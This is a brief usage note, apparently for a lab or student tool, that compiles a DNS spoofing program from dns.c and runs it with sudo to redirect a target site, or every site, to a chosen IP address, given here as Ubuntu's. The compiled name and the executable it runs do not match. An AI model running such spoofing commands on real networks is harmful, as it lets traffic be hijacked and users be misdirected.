gcc dns.c -o dns_spoof
#first argument is the target site that needs to be spoofed - specify either the site name or the option "all"
sudo ./a.out www.xyz.com 91.189.94.40

#91.189.94.40 - www.ubuntu.com IP
